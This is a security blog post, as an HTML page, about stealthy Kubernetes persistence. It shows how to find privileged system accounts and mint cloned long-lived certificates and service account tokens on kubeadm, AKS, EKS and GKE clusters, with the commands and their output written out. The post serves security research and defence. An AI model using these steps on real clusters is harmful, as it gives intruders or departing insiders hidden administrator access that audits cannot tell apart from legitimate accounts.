<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Attack of the clones - Stealthy Kubernetes persistence with eathar, tòcan and teisteanas</title>
	
	<meta name="author" content="raesene">

	<!-- Enable responsive viewport -->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
	<!--[if lt IE 9]>
	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->

	<!-- Le styles -->
	<link href="https://raesene.github.io/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
	<link href="https://raesene.github.io/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
	<link href="https://raesene.github.io/assets/resources/syntax/syntax.css" rel="stylesheet">
	<link href="https://raesene.github.io/assets/css/style.css" rel="stylesheet">

	<!-- Le fav and touch icons -->
	<!-- Update these with your own images
	<link rel="shortcut icon" href="images/favicon.ico">
	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
	-->

	<link rel="alternate" type="application/rss+xml" title="" href="https://raesene.github.io/feed.xml">
</head>

<body>
	<nav class="navbar navbar-default visible-xs" role="navigation">
		<!-- Brand and toggle get grouped for better mobile display -->
		<div class="navbar-header">
			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			
			<a type="button" class="navbar-toggle nav-link" href="https://github.com/raesene">
				<i class="fa fa-github"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="https://twitter.com/raesene">
				<i class="fa fa-twitter"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="mailto:raesene@gmail.com">
				<i class="fa fa-envelope"></i>
			</a>
			
			<a class="navbar-brand" href="https://raesene.github.io/">
				<img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036?s=35" class="img-circle" />
				Raesene's Ramblings
			</a>
		</div>

		<!-- Collect the nav links, forms, and other content for toggling -->
		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
			<ul class="nav navbar-nav">
				<li class="active"><a href="https://raesene.github.io/">Home</a></li>
				<li><a href="https://raesene.github.io/categories/index.html">Categories</a></li>
				<li><a href="https://raesene.github.io/tags/index.html">Tags</a></li>
			</ul>
		</div><!-- /.navbar-collapse -->
	</nav>

	<!-- nav-menu-dropdown -->
	<div class="btn-group hidden-xs" id="nav-menu">
		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
			<i class="fa fa-bars"></i>
		</button>
		<ul class="dropdown-menu" role="menu">
			<li><a href="https://raesene.github.io/"><i class="fa fa-home"></i>Home</a></li>
			<li><a href="https://raesene.github.io/categories/index.html"><i class="fa fa-folder"></i>Categories</a></li>
			<li><a href="https://raesene.github.io/tags/index.html"><i class="fa fa-tags"></i>Tags</a></li>
			<li class="divider"></li>
			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
		</ul>
	</div>

	<div class="col-sm-3 sidebar hidden-xs">
		<!-- sidebar.html -->
<header class="sidebar-header" role="banner">
	<a href="https://raesene.github.io/">
		<img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036?s=150" class="img-circle" />
	</a>
	<h3 class="title">
        <a href="https://raesene.github.io/">Raesene's Ramblings</a>
    </h3>
</header>


<div id="bio" class="text-center">
	Security Geek, Kubernetes, Docker, Ruby, Hillwalking
</div>


<div id="contact-list" class="text-center">
	<ul class="list-unstyled list-inline">
		
		<li>
			<a class="btn btn-default btn-sm" href="https://github.com/raesene">
				<i class="fa fa-github-alt fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="https://twitter.com/raesene">
				<i class="fa fa-twitter fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="mailto:raesene@gmail.com">
				<i class="fa fa-envelope fa-lg"></i>
			</a>
		</li>
		
	</ul>
	<ul id="contact-list-secondary" class="list-unstyled list-inline">
		
		
		<li>
			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/rorym">
				<i class="fa fa-linkedin fa-lg"></i>
			</a>
		</li>
		
		<li>
			<a class="btn btn-default btn-sm" href="https://raesene.github.io/feed.xml">
				<i class="fa fa-rss fa-lg"></i>
			</a>
		</li>
	</ul>
</div>
<!-- sidebar.html end -->

	</div>

	<div class="col-sm-9 col-sm-offset-3">
		<div class="page-header">
  <h1>Attack of the clones - Stealthy Kubernetes persistence with eathar, tòcan and teisteanas </h1>
</div>
	
<article>

	<div class="col-sm-10">
	 <span class="post-date">
	   
	   December 
	   21st,
	     
	   2022
	 </span>
	  <div class="article_body">
	  <p>Follwing on from the <a href="https://www.container-security.site/defenders/PCI_Container_Orchestration_Guidance.html">PCI Series</a> I thought it’d be nice to do a bit more of an attack focused piece for a change!</p>

<p>I noticed that Microsoft have released a new version of the their <a href="https://www.microsoft.com/en-us/security/blog/2022/12/07/mitigate-threats-with-the-new-threat-matrix-for-kubernetes/">threat matrix for Kubernetes</a>, looking at the Persistence section, while they covered some of the usual suspects like static pods, there were some options that attackers can likely use to keep access to clusters that they didn’t cover, around the use of Kubernetes APIs to use or create long-lived credentials which clone system accounts.</p>

<p>This kind of persistence technique would apply where the attacker has temporary access to relatively privileged credentials and wants to ensure that they retain access for the long term. this could be the case where an attacker has gained access to an administrator laptop, or where a disgruntled insider wants to retain access perhaps after they have left the organisation.</p>

<p>This kind of attack is made easier by the fact that the major managed Kubernetes distributions (GKE, EKS, AKS) all place the API server on the Internet by default. Whilst their hardening guides might mention removing it from the Internet, looking at the <a href="https://www.shodan.io/search/facet?query=product%3A%22Kubernetes%22&amp;facet=org">current statistics</a> from Shodan we can see plenty of Kubernetes hosts exposed to the Internet from the major cloud providers, and plenty of other hosts from smaller providers.</p>

<p><img src="https://raesene.github.io/assets/media/k8sproductshodan.png" alt="Kubernetes on Shodan by Organization" /></p>

<h2 id="options-for-persistent-credentials">Options for Persistent credentials.</h2>

<p>There are effectively four ways, we can achieve the goal of having a long lasting set of privileged credentials for attacker persistence.</p>

<p>The first option is to grab the cluster CA certificate and key which then lets us mint new credentials for any user in the cluster. This one notably only works with unmanaged clusters (so no running it on GKE, EKS or AKS). I’ve covered this one <a href="https://raesene.github.io/blog/2019/04/16/kubernetes-certificate-auth-golden-key/">before</a>, but it’s worth mentioning again as it’s a pretty easy way to get long lived credentials in the right kind of environment.</p>

<p>The second one is to use the Kubernetes CSR API to create new long-lived client certificates. Here we’ll want to find a high privileged user in the cluster and effectively create a clone set of credentials for them. Kubernetes does not have a user database, so this is perfectly possible and the auditing tools won’t be able to tell the difference between the original and the clone.</p>

<p>The third option is to use the TokenRequest API to create new long-lived service account token. As with the CSR option, we need to find a high privileged service account in the cluster and then create a clone set of credentials for it.</p>

<p>The fourth one is the simplest and is mentioned in the threat matrix, which is that in older Kubernetes clusters (v1.23 and below) we can just access the service account token secrets associated with system accounts, grab the token and then we can use that to authenticate to the API server. Notably these secrets <em>do not expire</em> and the only way to revoke their access is to delete the associated service account. Where we’re stealing the token of a core controller, that could be a bit of a tricky thing for the defender to fix.</p>

<h2 id="find-a-target-userservice-account-to-clone">Find a target user/service account to clone</h2>

<p>Effectively all these techniques start from the same point which is finding an existing high privileged account which is part of the operational workflow of the cluster, so that we can retrieve an existing credential or create a set of clone credentials that we can use.</p>

<p>To do this we’ll use <a href="https://github.com/raesene/eathar">eathar</a> which is a Kubernetes security scanner and has some checks for privileged RBAC access.</p>

<p>We’ll be using clusters setup with standard defaults with whatever the vendor currently offers.</p>

<ul>
  <li>Kubeadm 1.25 (KinD)</li>
  <li>AKS 1.24.6</li>
  <li>EKS v1.23.13-eks-fb459a0</li>
  <li>GKE v1.24.7-gke.900</li>
</ul>

<h3 id="kubeadm-125-cluster">Kubeadm 1.25 Cluster</h3>

<p>Starting with a vanilla Kubeadm 1.25 cluster, we can start by looking for wildcard users. These are users that have access to all resources in the cluster, and are effectively the same as having cluster admin access.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">eathar rbac wildcardusers
Findings for the Users with wildcard access to all resources check
ClusterRoleBinding cluster-admin
Subjects:
  Kind: Group, Name: system:masters
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
</span></code></pre></div></div>

<p>This isn’t actually really useful as the only subject is a Group, and we can’t use that to create a clone set of credentials, we really need a user or service account.</p>

<p>The next thing we can try is looking for users who have “get secrets” at the cluster level. These users can retrieve any secret from the cluster, which is pretty useful with older clusters as we can use it for retrieving any service account tokens (as well as anything else held as secrets)</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">eathar rbac getsecretsusers
Findings for the Users with access to secrets check
ClusterRoleBinding system:controller:expand-controller
Subjects:
  Kind: ServiceAccount, Name: expand-controller, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:expand-controller, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:persistent-volume-binder
Subjects:
  Kind: ServiceAccount, Name: persistent-volume-binder, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:persistent-volume-binder, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:kube-controller-manager
Subjects:
  Kind: User, Name: system:kube-controller-manager
RoleRef:
  Kind: ClusterRole, Name: system:kube-controller-manager, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:node
Subjects:
RoleRef:
  Kind: ClusterRole, Name: system:node, APIGroup: rbac.authorization.k8s.io
------------------------
</span></code></pre></div></div>

<p>This one shows some better options, notably the <code class="language-plaintext highlighter-rouge">system:kube-controller-manager</code> user, and the two service accounts. The <code class="language-plaintext highlighter-rouge">system:node</code> binding isn’t useful as (unusually) there are no subjects!</p>

<p>Looking at the rights for <code class="language-plaintext highlighter-rouge">system:kube-controller-manager</code> we can see that not only does it have get secrets at the cluster level but also create on serviceaccounts/token which is useful for creating more credentials.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">kubectl auth can-i --list --as system:kube-controller-manager
Resources                                       Non-Resource URLs   Resource Names              Verbs
secrets                                         []                  []                          [create delete get update]
serviceaccounts                                 []                  []                          [create get update]
events                                          []                  []                          [create patch update]
events.events.k8s.io                            []                  []                          [create patch update]
endpoints                                       []                  []                          [create]
serviceaccounts/token                           []                  []                          [create]
tokenreviews.authentication.k8s.io              []                  []                          [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []                          [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []                          [create]
subjectaccessreviews.authorization.k8s.io       []                  []                          [create]
leases.coordination.k8s.io                      []                  []                          [create]
endpoints                                       []                  [kube-controller-manager]   [get update]
leases.coordination.k8s.io                      []                  [kube-controller-manager]   [get update]
</span></code></pre></div></div>

<p>then looking at the rights for the two service accounts the persistent-volume-binder controller has some pretty useful rights including create pod and get secrets</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">kubectl auth can-i --list --as system:serviceaccount:kube-system:persistent-volume-binder
Resources                                       Non-Resource URLs                     Resource Names   Verbs
persistentvolumes                               []                                    []               [create delete get list update watch]
pods                                            []                                    []               [create delete get list watch]
endpoints                                       []                                    []               [create delete get update]
services                                        []                                    []               [create delete get]
events.events.k8s.io                            []                                    []               [create patch update]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
persistentvolumeclaims                          []                                    []               [get list update watch]
storageclasses.storage.k8s.io                   []                                    []               [get list watch]
nodes                                           []                                    []               [get list]
secrets                                         []                                    []               [get]
persistentvolumeclaims/status                   []                                    []               [update]
persistentvolumes/status                        []                                    []               [update]
events                                          []                                    []               [watch create patch update]
</span></code></pre></div></div>

<h3 id="aks-1246">AKS 1.24.6</h3>

<p>Let’s take a look at how this would work in an AKS cluster. Let’s start by looking for wildcard users.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">eathar rbac wildcardusers
Findings for the Users with wildcard access to all resources check
ClusterRoleBinding aks-cluster-admin-binding
Subjects:
  Kind: User, Name: clusterAdmin
  Kind: User, Name: clusterUser
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding cluster-admin
Subjects:
  Kind: Group, Name: system:masters
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
------------------------
</span></code></pre></div></div>

<p>Well, that was easy :) There are two user accounts <code class="language-plaintext highlighter-rouge">clusterAdmin</code> and <code class="language-plaintext highlighter-rouge">clusterUser</code> which have full cluster admin access, so if we create a certificate for either of those we’ll have full cluster admin access. If we want a service account to clone we can look for principals who have get secrets at the cluster level</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">eathar rbac getsecretsusers
Findings for the Users with access to secrets check
ClusterRoleBinding aks-service-rolebinding
Subjects:
  Kind: User, Name: aks-support
RoleRef:
  Kind: ClusterRole, Name: aks-service, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding csi-azurefile-node-secret-binding
Subjects:
  Kind: ServiceAccount, Name: csi-azurefile-node-sa, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: csi-azurefile-node-secret-role, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:aks-client-nodes
Subjects:
  Kind: Group, Name: system:nodes
RoleRef:
  Kind: ClusterRole, Name: system:node, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:azure-cloud-provider-secret-getter
Subjects:
  Kind: ServiceAccount, Name: azure-cloud-provider, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:azure-cloud-provider-secret-getter, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:expand-controller
Subjects:
  Kind: ServiceAccount, Name: expand-controller, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:expand-controller, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:persistent-volume-binder
Subjects:
  Kind: ServiceAccount, Name: persistent-volume-binder, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:persistent-volume-binder, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:kube-controller-manager
Subjects:
  Kind: User, Name: system:kube-controller-manager
RoleRef:
  Kind: ClusterRole, Name: system:kube-controller-manager, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:node
Subjects:
RoleRef:
  Kind: ClusterRole, Name: system:node, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:persistent-volume-binding
Subjects:
  Kind: ServiceAccount, Name: persistent-volume-binder, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:persistent-volume-secret-operator, APIGroup: rbac.authorization.k8s.io
------------------------
</span></code></pre></div></div>

<p>We can see plenty of options to clone there, including the two we saw in Kubeadm.</p>

<h3 id="eks-v12313-eks-fb459a0">EKS v1.23.13-eks-fb459a0</h3>

<p>First up looking for wildcard users.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go"> eathar rbac wildcardusers
Findings for the Users with wildcard access to all resources check
ClusterRoleBinding cluster-admin
Subjects:
  Kind: Group, Name: system:masters
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding eks:addon-cluster-admin
Subjects:
  Kind: User, Name: eks:addon-manager
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
------------------------
</span></code></pre></div></div>

<p>We see that there’s a user account <code class="language-plaintext highlighter-rouge">eks:addon-manager</code> which has full cluster admin access. Looking at for principals with the rights to get secrets we get the following:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">eathar rbac getsecretsusers
Findings for the Users with access to secrets check
ClusterRoleBinding eks:addon-manager
Subjects:
  Kind: User, Name: eks:addon-manager
RoleRef:
  Kind: ClusterRole, Name: eks:addon-manager, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:expand-controller
Subjects:
  Kind: ServiceAccount, Name: expand-controller, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:expand-controller, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:persistent-volume-binder
Subjects:
  Kind: ServiceAccount, Name: persistent-volume-binder, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:persistent-volume-binder, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:kube-controller-manager
Subjects:
  Kind: User, Name: system:kube-controller-manager
RoleRef:
  Kind: ClusterRole, Name: system:kube-controller-manager, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:node
Subjects:
RoleRef:
  Kind: ClusterRole, Name: system:node, APIGroup: rbac.authorization.k8s.io
------------------------
</span></code></pre></div></div>

<p>For service accounts we’ve got the same ones as we had with Kubeadm and AKS.</p>

<h3 id="gke-v1247-gke900">GKE v1.24.7-gke.900</h3>

<p>Looking at GKE for wildcard users, we can see the following:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">eathar rbac wildcardusers
Findings for the Users with wildcard access to all resources check
ClusterRoleBinding cluster-admin
Subjects:
  Kind: Group, Name: system:masters
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding storage-version-migration-migrator-v2
Subjects:
  Kind: User, Name: system:storageversionmigrator
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
</span></code></pre></div></div>

<p>So we’ve got a nice user with cluster-admin access to use for client certificates. Looking for users with get secrets access we get the following:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">ClusterRoleBinding kubelet-cluster-admin
Subjects:
RoleRef:
  Kind: ClusterRole, Name: system:node, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:expand-controller
Subjects:
  Kind: ServiceAccount, Name: expand-controller, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:expand-controller, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:persistent-volume-binder
Subjects:
  Kind: ServiceAccount, Name: persistent-volume-binder, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:persistent-volume-binder, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:glbc-status
Subjects:
  Kind: User, Name: system:controller:glbc
  Kind: User, Name: system:l7-lb-controller
RoleRef:
  Kind: ClusterRole, Name: system:glbc-status, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:kube-controller-manager
Subjects:
  Kind: User, Name: system:kube-controller-manager
RoleRef:
  Kind: ClusterRole, Name: system:kube-controller-manager, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:node
Subjects:
RoleRef:
  Kind: ClusterRole, Name: system:node, APIGroup: rbac.authorization.k8s.io
------------------------
</span></code></pre></div></div>

<p>So we’ve got our usual <code class="language-plaintext highlighter-rouge">persistent-volume-binder</code> service account and some other options as well.</p>

<h2 id="creating-a-cloned-user-account-using-teisteanas">Creating a cloned user account using Teisteanas</h2>

<p>Now we’ve got our list of users and service accounts we can clone, we can use <a href="https://github.com/raesene/teisteanas">Teisteanas</a> to create Kubeconfigs which use client certificate authentication for users. You can do these steps manually, but Teisteanas makes it easy to do this quickly.</p>

<h3 id="kubeadm-125">Kubeadm 1.25</h3>

<p>Here we’ll create a clone for our <code class="language-plaintext highlighter-rouge">system:kube-controller-manager</code> user account.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">teisteanas -username system:kube-controller-manager
Certificate Successfully issued to username system:kube-controller-manager in group none , signed by kubernetes, valid until 2023-12-22 10:27:09 +0000 UTC
</span></code></pre></div></div>

<p>From this we can see it succeeded in creating the kubeconfig and the expiry is 12 months, which is the default. We can now use this kubeconfig to authenticate to the cluster.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">kubectl --kubeconfig system\:kube-controller-manager.config auth can-i --list
Resources                                       Non-Resource URLs   Resource Names              Verbs
secrets                                         []                  []                          [create delete get update]
serviceaccounts                                 []                  []                          [create get update]
events                                          []                  []                          [create patch update]
events.events.k8s.io                            []                  []                          [create patch update]
endpoints                                       []                  []                          [create]
serviceaccounts/token                           []                  []                          [create]
tokenreviews.authentication.k8s.io              []                  []                          [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []                          [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []                          [create]
subjectaccessreviews.authorization.k8s.io       []                  []                          [create]
leases.coordination.k8s.io                      []                  []                          [create]
</span></code></pre></div></div>

<p>We can see we’ve got plenty of rights. We can also use this kubeconfig to authenticate to the cluster and use it to create a new service accounts if we wanted to.</p>

<h3 id="aks-1246-1">AKS 1.24.6</h3>

<p>With AKS, the obvious target is the <code class="language-plaintext highlighter-rouge">clusterAdmin</code> user account.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">teisteanas -username clusterAdmin
Certificate Successfully issued to username clusterAdmin in group none , signed by ca, valid until 2023-12-22 10:29:41 +0000 UTC
</span></code></pre></div></div>

<p>Again we get a one year lifetime on our credential.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">kubectl --kubeconfig clusterAdmin.config auth can-i --list
Resources                                       Non-Resource URLs   Resource Names   Verbs
*.*                                             []                  []               [*]
                                                [*]                 []               [*]
</span></code></pre></div></div>

<p>Checking the rights, we get that delightful <code class="language-plaintext highlighter-rouge">*.*</code> which means we have full cluster admin access.</p>

<h3 id="eks-v12313-eks-fb459a0-1">EKS v1.23.13-eks-fb459a0</h3>

<p>Trying our client certificate generation technique on EKS, we get the following:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">teisteanas -username eks:addon-manager
2022/12/22 16:15:42 Error issuing cert, are you trying this with EKS?
</span></code></pre></div></div>

<p>This is because EKS has effectively disabled the CSR API for certificates that can authenticate to the Kubernetes API server. This isn’t officially in their documentation (that I can find) but there’s a <a href="https://github.com/aws/containers-roadmap/issues/1604">Github issue</a> which confirms this.</p>

<h3 id="gke-v1247-gke900-1">GKE v1.24.7-gke.900</h3>

<p>For GKE we’re going to use our <code class="language-plaintext highlighter-rouge">system:storageversionmigrator</code> user account.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">teisteanas -username system:storageversionmigrator
Certificate Successfully issued to username system:storageversionmigrator in group none , signed by e3d7d8ea-bc41-4e34-a0d4-e7b7fdbbc66b, valid until 2027-12-21 18:02:26 +0000 UTC
</span></code></pre></div></div>

<p>There’s an interesting difference here, which is that the certificate is valid for <strong>5 years</strong> by default, which is a nice level of persistence!</p>

<p>Checking the access we can confirm we have cluster-admin</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">ubectl --kubeconfig system\:storageversionmigrator.config auth can-i --list
Warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                        Non-Resource URLs   Resource Names   Verbs
*.*                                              []                  []               [*]
                                                 [*]                 []               [*]
</span></code></pre></div></div>
<p>So that works pretty well, as it did with AKS and Kubeadm.</p>

<h2 id="cloning-service-account-credentials-with-tòcan">Cloning service account credentials with tòcan</h2>

<p>If we want to create an credential based on a service account, we can do that using the TokenRequest API. <a href="https://github.com/raesene/tocan">Tòcan</a> is a tool which just wraps the API and automates creating the Kubeconfig file.</p>

<h3 id="kubeadm-125-1">Kubeadm 1.25</h3>

<p>For Kubeadm we’ll create a token for the <code class="language-plaintext highlighter-rouge">persistent-volume-binder</code> service account in the <code class="language-plaintext highlighter-rouge">kube-system</code> namespace, and look to create the token for 1 year.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">tocan -service-account persistent-volume-binder -namespace kube-system -expiration-seconds 31536000
Kubeconfig file persistent-volume-binder.kubeconfig created for service account persistent-volume-binder in namespace kube-system
</span></code></pre></div></div>

<p>We can then check the rights with kubectl to confirm it worked ok</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">kubectl --kubeconfig persistent-volume-binder.kubeconfig auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
persistentvolumes                               []                                    []               [create delete get list update watch]
pods                                            []                                    []               [create delete get list watch]
endpoints                                       []                                    []               [create delete get update]
services                                        []                                    []               [create delete get]
events.events.k8s.io                            []                                    []               [create patch update]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
persistentvolumeclaims                          []                                    []               [get list update watch]
storageclasses.storage.k8s.io                   []                                    []               [get list watch]
nodes                                           []                                    []               [get list]
secrets                                         []                                    []               [get]
persistentvolumeclaims/status                   []                                    []               [update]
persistentvolumes/status                        []                                    []               [update]
events                                          []                                    []               [watch create patch update]
</span></code></pre></div></div>

<p>We can also check the expiration of the token. Probably the easiest way to do this is just paste the token into <a href="https://jwt.io/">jwt.io</a></p>

<p><img src="https://raesene.github.io/assets/media/pvbjwt.png" alt="jwt token issued for the persistent volume binder service account" /></p>

<p>From this the <code class="language-plaintext highlighter-rouge">exp</code> value of <code class="language-plaintext highlighter-rouge">1703242042</code> can be decoded to show that the token expires on Friday, 22 December 2023 10:47:22.</p>

<h3 id="aks-1246-2">AKS 1.24.6</h3>

<p>For AKS we can use the same service account as it was one of the ones returned in our <code class="language-plaintext highlighter-rouge">eathar</code> checks for access to secrets at the cluster level, and this works the same way, including the 1 year expiration, which works fine.</p>

<h3 id="eks-v12313-eks-fb459a0-2">EKS v1.23.13-eks-fb459a0</h3>

<p>For EKS we can again create a token for the same service account and it will issue ok. However looking at the <code class="language-plaintext highlighter-rouge">exp</code> field of the token we can see it’s only valid for 24 hours, a far cry from the 1 year we were expecting. It appears that AWS have decided to limit the maximum duration of issued tokens. So whilst this technique works, it’d be quite a bit more noisy as it would require daily refreshes.</p>

<h3 id="gke-v1247-gke900-2">GKE v1.24.7-gke.900</h3>

<p>for GKE we can use the same service account again as it was one of the ones returned with our <code class="language-plaintext highlighter-rouge">eathar</code> checks.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tocan -service-account persistent-volume-binder -namespace kube-system -expiration-seconds 31536000
W1222 18:04:58.428287   96628 warnings.go:70] requested expiration of 31536000 seconds shortened to 172800 seconds
Kubeconfig file persistent-volume-binder.kubeconfig created for service account persistent-volume-binder in namespace kube-system
</code></pre></div></div>

<p>Interestingly we get a warning and GKE has done something similar to EKS in that it’s limited the maximum duration of issued tokens, this time to two days. So again, whilst this technique works, it’d be quite a bit more noisy as it would require refreshes every other day.</p>

<h2 id="stealing-secrets-from-existing-service-accounts">Stealing secrets from existing service accounts</h2>

<p>As mentioned this one only works in older clusters as the Kubernetes project have been working to reduce the use of non-expiring service account secrets. Where we do find a cluster, we don’t need any new tooling to create our Kubeconfig file as there’s a <a href="https://krew.sigs.k8s.io/">krew</a> plugin called <a href="https://github.com/superbrothers/kubectl-view-serviceaccount-kubeconfig-plugin">view-serviceaccount-kubeconfig</a> which we can use.</p>

<h3 id="kubeadm-125-2">Kubeadm 1.25</h3>

<p>Checking for secrets in <code class="language-plaintext highlighter-rouge">kube-system</code> we can see that they’re not there (as expected)</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">kubectl get secrets -n kube-system
NAME                     TYPE                            DATA   AGE
bootstrap-token-abcdef   bootstrap.kubernetes.io/token   6      6h33m
</span></code></pre></div></div>

<p>so if we try to create a kubeconfig file we get an error</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">kubectl view-serviceaccount-kubeconfig persistent-volume-binder -n kube-system
Error: serviceaccount persistent-volume-binder has no secrets
</span></code></pre></div></div>

<h3 id="aks-1246-3">AKS 1.24.6</h3>

<p>This technique doesn’t work in AKS as there are no secrets for service accounts in 1.24</p>

<h3 id="eks-v12313-eks-fb459a0-3">EKS v1.23.13-eks-fb459a0</h3>

<p>The default EKS cluster that we got created is running 1.23, so this technique still works</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">kubectl view-serviceaccount-kubeconfig persistent-volume-binder -n kube-system &gt;</span><span class="w"> </span>persistent-volume-binder-secret.kubeconfig
</code></pre></div></div>
<p>We can then test the kubeconfig file to make sure it works</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go"> kubectl --kubeconfig persistent-volume-binder-secret.kubeconfig auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names     Verbs
persistentvolumes                               []                                    []                 [create delete get list update watch]
pods                                            []                                    []                 [create delete get list watch]
endpoints                                       []                                    []                 [create delete get update]
services                                        []                                    []                 [create delete get]
events.events.k8s.io                            []                                    []                 [create patch update]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []                 [create]
